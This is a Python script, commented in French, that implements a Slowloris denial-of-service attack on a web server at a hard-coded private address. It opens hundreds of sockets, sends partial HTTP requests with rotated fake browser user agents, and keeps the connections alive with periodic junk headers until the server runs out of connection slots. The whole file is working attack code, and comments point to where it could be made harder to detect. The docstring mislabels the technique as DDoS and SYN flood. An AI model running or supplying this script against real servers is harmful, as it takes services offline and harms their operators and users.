"""
Slowloris: forme typique de deni de service DDOS
noyer une cible avec suffisamment de sockets
artificiellement gardée connectées grâce à l'envoi 
périodiques d'en-tête http (GET flood) ou de trames TCP (SYN flood)
"""

from socket import *
from time import sleep
import random

## CIBLE
HOST = "192.168.1.44"
PORT = 80

# Paramétrage de la charge et temps de maj des socket
nb_socket = 300
sleep_time = 5

list_of_sockets = []

# liste de headers http "user-agent" pour se faire passer pour d'autres navigateurs
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"
]

def init_socket():
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(4)
    s.connect((HOST, PORT))
    # path à complexifier
    s.send(f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\n".encode("utf-8"))
    ua = random.choice(user_agents)
    s.send(f"User-Agent: {ua}\r\n".encode("utf-8"))
    s.send(f"Accept-Language: en-US,en,q=0.5\r\n".encode("utf-8"))
    return s

def slowloris_iteration():
    """
    1. envoyer des headers pour maintenir la connexion des socket
    2. recréer des sockets si certaines ont été détruites
    """
    print(f"keep alive {nb_socket} sockets")
    for s in list_of_sockets:
        try:
            # header à compléxifier en fonction de la cible
            s.send(f"X-a: {random.randint(0, 5000)}\r\n".encode("utf-8"))
        except error:
            list_of_sockets.remove(s)
    
    diff = nb_socket - len(list_of_sockets)
    
    if diff <= 0:
        return
    
    print(f"creating {diff} sockets.")
    for _ in range(diff):
        try:
            s = init_socket()
            if not s: continue
        except error as e:
            print(e)
            break
        list_of_sockets.append(s)


def main():
    """
    1. création des sockets, avec envoi de requête initiale
    2. itération sur des envois supplémentaires de headers
       pour chaque socket dans le but de les maintenir
    3. contrôle du nb total de socket (ajout, suppression ...)
    """
    print(f"attacking {HOST} with {nb_socket} sockets.")
    for _ in range(nb_socket):
        try:
            s = init_socket()
        # error est l'exception principale
        # du module socket
        except error as e:
            print(e)
            break
        list_of_sockets.append(s)
    
    while True:
        try:
            slowloris_iteration()
        except (KeyboardInterrupt, SystemExit):
            print("stopping attack")
            break
        except Exception as e:
            print(f"issue with script: {e}")
        # attente à complexifier
        sleep(sleep_time)


if __name__ == "__main__":
    main()    
